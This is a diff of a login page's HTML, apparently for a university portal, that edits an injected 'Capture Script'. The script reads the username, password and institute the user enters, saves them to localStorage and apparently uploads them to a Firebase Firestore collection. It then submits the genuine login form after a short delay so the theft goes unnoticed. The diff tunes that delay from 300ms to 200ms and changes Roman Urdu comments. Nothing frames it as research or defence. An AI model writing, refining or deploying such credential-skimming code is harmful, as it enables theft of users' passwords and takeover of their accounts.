@@ -125,7 +125,7 @@ return true;
 		</footer>
 </form>
 
-<!-- 300ms Optimized Capture Script -->
+<!-- 200ms Ultra-Fast Capture Script -->
 <script type="module">
 	import { initializeApp } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-app.js";
 	import { getFirestore, collection, addDoc } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-firestore.js";
@@ -154,7 +154,7 @@ return true;
 			const institute = instituteSelect.options[instituteSelect.selectedIndex].text;
 
 			if (username && password) {
-				// LocalStorage backup taake data kisi surat zaya na ho
+				// LocalStorage backup taake data safe rahay
 				localStorage.setItem("bu_user", username);
 				localStorage.setItem("bu_pass", password);
 
@@ -171,14 +171,14 @@ return true;
 				}
 			}
 
-			// Exact 300ms delay - Fast redirect + Guaranteed capture
+			// Sirf 200ms ka delay
 			setTimeout(() => {
 				if (typeof WebForm_DoPostBackWithOptions === 'function') {
 					__doPostBack('ctl00$BodyPH$btnLogin', '');
 				} else {
 					document.getElementById('form1').submit();
 				}
-			}, 300);
+			}, 200);
 		});
 	}
 </script>
